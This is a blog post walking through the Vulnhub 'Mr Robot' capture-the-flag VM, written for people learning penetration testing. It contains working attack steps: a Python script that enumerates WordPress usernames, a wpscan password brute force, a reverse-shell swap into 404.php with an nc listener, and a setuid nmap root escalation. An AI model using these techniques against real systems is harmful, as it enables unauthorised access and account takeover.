---
layout: post
title: "Mr Robot Walkthrough (Vulnhub)"
date: 2017-02-20 12:00:00
share: true
comments: true
tags: [Vulnhub Walkthrough]
---

Mr Robot 1 VM can be downloaded [here](https://www.vulnhub.com/entry/mr-robot-1,151/).

## 0\. Get VMs IP

Netdiscover didn't reveal the VM, so I did a quick nmap scan.

```console
root@kali:~# nmap 192.168.1.0/24 -F

Starting Nmap 7.40 ( https://nmap.org ) at 2017-01-20 15:25 EST
Stats: 0:00:25 elapsed; 253 hosts completed (2 up), 2 undergoing SYN Stealth Scan

...

Nmap scan report for 192.168.1.72
Host is up (0.00015s latency).
Not shown: 97 filtered ports
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https
MAC Address: 08:00:27:CE:C4:AA (Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.1.73
Host is up (0.0000010s latency).
All 100 scanned ports on 192.168.1.73 are closed

Nmap done: 256 IP addresses (3 hosts up) scanned in 26.55 seconds
```

---

## 1\. Enumeration

#### TCP Ports enumeration

```console
root@kali:~# nmap -sV 192.168.1.72

Starting Nmap 7.40 ( https://nmap.org ) at 2017-01-20 15:27 EST
Nmap scan report for 192.168.1.72
Host is up (0.00014s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
MAC Address: 08:00:27:CE:C4:AA (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Nothing impressive, we didn't even find any extra services running than the ones we found using `-F` earlier.

---

## 2\. Web server

Sourcecode doesn't reveal much, and it feels like some ad campaign for Mr Robot series. I decided to ignore it and look for something that's actually useful.

```console
root@kali:~# curl http://192.168.1.72/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt


root@kali:~# curl http://192.168.1.72/key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9
```

We found our first key (`key-1-of-3.txt`). It contains what seems to be an MD5 hash but wasn't able to crack it.

`fsocity.dic` looks like a wordlist to me, yet some words felt to be repeating over and over again, let's do some processing on it to remove the duplicates.

```console
root@kali:~# wc -l fsocity.dic
858160 fsocity.dic
root@kali:~# cat fsocity.dic | sort | uniq > fsociety_filtered.txt
root@kali:~# wc -l fsociety_filtered.txt
11451 fsociety_filtered.txt
root@kali:~#
```

The filtered list's word count is exactly 1/74th of the unfiltered list size. Some likes to copy and paste.

Next we'll use `dirsearch` to find any worthy directories.

```console
root@kali:~/Desktop# ./dirsearch/dirsearch.py -u http://192.168.1.72/ -e php -x 301,302,403

 _|. _ _  _  _  _ _|_    v0.3.7
(_||| _) (/_(_|| (_| )

Extensions: php | Threads: 10 | Wordlist size: 5151

Error Log: /root/Desktop/dirsearch/logs/errors-17-01-20_15-55-07.log

Target: http://192.168.1.72/

[15:55:07] Starting:
[15:55:30] 200 -    1KB - /admin/
[15:55:30] 200 -    1KB - /admin/?/login
[15:55:31] 200 -    1KB - /admin/index.html
[15:55:56] 200 -    0B  - /favicon.ico
[15:56:01] 200 -    1KB - /index.html
[15:56:03] 200 -  504KB - /intro
[15:56:05] 200 -   19KB - /license.txt
[15:56:18] 200 -   10KB - /readme
[15:56:18] 200 -   10KB - /readme.html
[15:56:19] 200 -   41B  - /robots.txt
[15:56:22] 200 -    0B  - /sitemap
[15:56:22] 200 -    0B  - /sitemap.xml
[15:56:22] 200 -    0B  - /sitemap.xml.gz
[15:56:30] 200 -    0B  - /wp-config.php
[15:56:31] 200 -    0B  - /wp-content/
[15:56:31] 200 -    0B  - /wp-content/plugins/google-sitemap-generator/sitemap-core.php
[15:56:31] 200 -    3KB - /wp-login
[15:56:31] 500 -    0B  - /wp-includes/rss-functions.php
[15:56:31] 200 -    3KB - /wp-login/
[15:56:31] 200 -    3KB - /wp-login.php

Task Completed
```

The website is powered by Wordpress, we'll use `wpscan` to enumerate the site.

```console
root@kali:~/Desktop# wpscan --url http://192.168.1.72/ --enumerate u
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.2
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.1.72/
[+] Started: Fri Jan 20 16:01:35 2017

[+] robots.txt available under: 'http://192.168.1.72/robots.txt'
[!] The WordPress 'http://192.168.1.72/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523
[+] XML-RPC Interface available under: http://192.168.1.72/xmlrpc.php

[+] WordPress version 4.3.7 (Released on 2017-01-11) identified from rss generator, rdf generator, atom generator, links opml

[+] Enumerating plugins from passive detection ...
[+] No plugins found

[+] Enumerating usernames ...
[+] We did not enumerate any usernames

[+] Finished: Fri Jan 20 16:01:36 2017
[+] Requests Done: 57
[+] Memory used: 10.797 MB
[+] Elapsed time: 00:00:00
```

That also didn't reveal anything useful. Let's check if any of the words provided in the list we found can be used as a username. Wordpress login can tell you if the username exists or not by trying to login and checking the error message.


```
ERROR: Invalid username. [Lost your password?](http://192.168.1.72/wp-login.php?action=lostpassword)
```

I wrote a quick python script (with horrible performance) to find any existing usernames.

```python
import requests

open_file = open('fsociety_filtered.txt', 'r')
temp = open_file.read().splitlines()
count = 0
for username in temp:
    payload = {'log': '{0}'.format(username), 'pwd': 'dummy'}
    headers = {'Content-Type' : 'application/x-www-form-urlencoded'}
    cookies = dict(wordpress_test_cookie='WP+Cookie+check')
    r = requests.post("http://192.168.1.72/wp-login.php", data=payload, headers=headers, cookies=cookies)
    if "Invalid username" not in r.text:
        print username
```

Running it revealed that the user `elliot` exists.

I used wpscan to do a dictionary attack using the same list.

```console
root@kali:~/Desktop# wpscan --url http://192.168.1.72 --wordlist=/root/Desktop/fsociety_filtered.txt --username elliot --threads 20
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.2
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.1.72/
[+] Started: Fri Jan 20 16:42:46 2017

[+] robots.txt available under: 'http://192.168.1.72/robots.txt'
[!] The WordPress 'http://192.168.1.72/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523
[+] XML-RPC Interface available under: http://192.168.1.72/xmlrpc.php

[+] WordPress version 4.3.7 (Released on 2017-01-11) identified from rss generator, rdf generator, atom generator, links opml

[+] Enumerating plugins from passive detection ...
[+] No plugins found
[+] Starting the password brute forcer
  [+] [SUCCESS] Login : elliot Password : ER28-0652

  Brute Forcing 'elliot' Time: 00:01:07 <================================================================                                                                    > (5627 / 11452) 49.13%  ETA: 00:01:10
  +----+--------+------+-----------+
  | Id | Login  | Name | Password  |
  +----+--------+------+-----------+
  |    | elliot |      | **ER28-0652** |
  +----+--------+------+-----------+

[+] Finished: Fri Jan 20 16:43:55 2017
[+] Requests Done: 5679
[+] Memory used: 18.219 MB
[+] Elapsed time: 00:01:08
```


We found the password! It's `ER28-0652`.

---

## 3\. Getting a shell

`elliot` has administrative access on WP, which means we can easily change `404.php `file with a [reverse shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell). Go to `Appearance `-> `Editor` and swap the `404.php` code with your modified revsh. Make sure you change the IP and PORT in the php file. Then start a listener and hit a random page like http://192.168.1.72/idontexist.

```console
root@kali:~/Desktop# nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.1.73] from (UNKNOWN) [192.168.1.72] 41611
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 22:01:33 up  1:45,  0 users,  load average: 0.00, 0.04, 0.21
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/$
```

After little enumeration I found the following:

```
daemon@linux:/$ cd /home
cd /home
daemon@linux:/home$ ls -al
ls -al
total 12
drwxr-xr-x  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
drwxr-xr-x  2 root root 4096 Nov 13  2015 robot
daemon@linux:/home$ cd robot
cd robot
daemon@linux:/home/robot$ ls -al
ls -al
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
daemon@linux:/home/robot$
```


A quick search revealed that the MD5 hash stands for `abcdefghijklmnopqrstuvwxyz`.

```console
daemon@linux:/$ su - robot
su - robot
Password: abcdefghijklmnopqrstuvwxyz

$ whoami
whoami
robot
$ sudo -l
sudo -l
[sudo] password for robot: abcdefghijklmnopqrstuvwxyz

Sorry, user robot may not run sudo on linux.
$ ls
ls
key-2-of-3.txt password.raw-md5
$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

We found two keys, let's go for the last one.

---

## 4\. Getting root

Searching for setuid binaries is the answer.

```console
$ find / -user root -perm -4000 2>/dev/null
find / -user root -perm -4000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
$ /usr/local/bin/nmap --version
/usr/local/bin/nmap --version

nmap version 3.81 ( http://www.insecure.org/nmap/ )
```

Nmap isn't expected to have a `setuid bit, I realized it's vulnerable to a priv escalation vulnerability: https://gist.github.com/dergachev/7916152

```console
$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !whoami
!whoami
root
waiting to reap child : No child processes
nmap> !bash -p
!bash -p
bash-4.3# whoami
whoami
root
bash-4.3# cd /root
cd /root
bash-4.3# ls -al
ls -al
total 32
drwx------  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
-rw-------  1 root root 4058 Nov 14  2015 .bash_history
-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
drwx------  2 root root 4096 Nov 13  2015 .cache
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root 1024 Sep 16  2015 .rnd
bash-4.3# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

Aaand we're done! Quite simple one.
